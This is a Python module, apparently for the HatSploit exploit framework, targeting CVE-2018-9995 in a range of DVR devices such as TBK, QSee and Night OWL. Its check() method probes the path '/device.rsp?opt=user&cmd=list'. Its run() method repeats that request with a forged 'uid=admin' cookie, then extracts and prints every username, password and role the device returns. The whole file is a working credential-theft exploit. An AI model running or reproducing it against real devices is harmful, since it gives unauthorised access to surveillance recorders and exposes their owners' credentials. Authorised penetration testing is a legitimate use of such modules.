"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import json

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "DVR Multi Credentials Disclosure",
            'Module': "exploit/linux/generic/dvr_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "ezelf - vulnerability researcher",
            ],
            'Description': """
                Multiple DVR-like devices have a vulnerability allowing attackers to
                obtain credentials.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "TBK DVR4104",
                "TBK DVR4216",
                "Novo",
                "CeNova",
                "QSee",
                "Pulnix",
                "XVR 5 in 1",
                "Securus",
                "Night OWL",
                "DVR Login",
                "HVR Login",
                "MDVR Login"
            ],
            'References': [
                {'URL': 'https://github.com/EntySec/CamRaptor'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2018-9995'},
                {'URL': 'https://www.exploit-db.com/exploits/44577'},
                {'CVE': '2018-9995'},
                {'EDB': 44577}
            ],
            'DisclosureDate': "2018-10-04",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/device.rsp?opt=user&cmd=list',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/device.rsp?opt=user&cmd=list',
            cookies={"uid": "admin"},
        )

        try:
            json_data = json.loads(response.text)
            credentials = []

            for data in json_data["list"]:
                credentials.append((data["uid"], data["pwd"], data["role"]))

            self.print_table(
                "Credentials", ('Username', 'Password', 'Role'), *credentials
            )
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")
